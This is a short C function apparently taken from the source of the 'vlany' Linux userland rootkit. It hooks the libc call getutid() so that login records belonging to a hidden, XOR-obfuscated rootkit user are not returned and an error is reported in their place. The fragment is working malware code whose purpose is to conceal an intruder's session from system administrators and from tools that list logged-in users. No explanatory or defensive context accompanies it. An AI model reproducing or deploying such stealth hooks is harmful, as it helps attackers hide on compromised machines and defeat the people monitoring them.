struct utmp *getutid(const struct utmp *ut)
{
    #ifdef DEBUG
        printf("[vlany] getutid() called\n");
    #endif

    HOOK(old_getutid, CGETUTID);

    struct utmp *tmp = old_getutid(ut);

    if(tmp && tmp->ut_user != NULL)
    {
        char *vlany_user = strdup(VLANY_USER); xor(vlany_user);
        if(!strcmp(tmp->ut_user, vlany_user)) { CLEAN(vlany_user); errno = ESRCH; return NULL; }
        CLEAN(vlany_user);
    }

    return old_getutid(ut);
}
